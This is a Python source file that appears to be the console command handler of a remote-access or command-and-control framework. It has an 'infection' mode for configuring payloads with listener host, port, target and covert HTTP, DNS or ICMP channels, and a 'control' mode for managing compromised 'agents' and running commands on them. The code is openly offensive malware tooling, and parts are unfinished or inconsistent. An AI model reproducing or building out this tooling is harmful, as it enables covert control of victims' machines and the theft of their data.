from os import environ
from auxiliary.interface import *
from auxiliary.options import *
from modules.payload import *

infection = ['set', 'unset', 'options', 'make']
control = ['agents', 'use', 'cmd', 'kill', 'exec']
general = ['help', '?', 'mode', 'exit']

payload = Payload()

def execute(args):
    
    mode = environ.get('MODE', '')

    if args[0] in general:

        if args[0] == 'help' or args[0] == '?':
            if 'CONTROL' in mode:
                return Help.control
            if 'INFECTION' in mode:
                return Help.infection
            return Help.general

        if args[0] == 'exit':
            raise KeyboardInterrupt

        if args[0] == 'mode':
            if len(args) == 2:
                if args[1].upper() == 'INFECTION':
                    environ['MODE'] = '(INFECTION)'
                    return ''

                elif args[1].upper() == 'CONTROL':
                    environ['MODE'] = '(CONTROL)'
                    return ''
                    
            return error('Use: mode <infection|control>')

    if args[0] in infection:
        
        if 'INFECTION' not in mode:
            return error('Enter in Infection Mode!')

        if args[0] == 'set':
            if len(args) == 3:
                if args[1].upper() == 'LHOST':
                    payload.setLHOST(args[2])
                elif args[1].upper() == 'LPORT':
                    payload.setLPORT(args[2])
                elif args[1].upper() == 'RHOST':
                    payload.setRHOST(args[2])
                elif args[1].upper() == 'CHANNEL':
                    if args[2].upper() in ['HTTP', 'DNS', 'ICMP']:
                        payload.setCHANNEL(args[2].upper())
                    else:
                        return error('Accepted channels: HTTP, ICMP')
                else:
                    return error('Invalid option, check with: options')
                return args[1]+ ' => ' + args[2]
            return error('Use: set <option> <value>')
        
        if args[0] == 'unset':
            if args[1].upper() in ['LHOST', 'LPORT', 'RHOST', 'RPORT']:
                environ.pop(args[1].upper(), None)
                return ''
            return error('Use: unset <option>')

        if args[0] == 'options':
            return Options.payload(payload)

    if args[0] in control:

        if 'CONTROL' not in mode:
            return error('Enter in Control Mode!')

    return error('Command not found.\nTry: help')

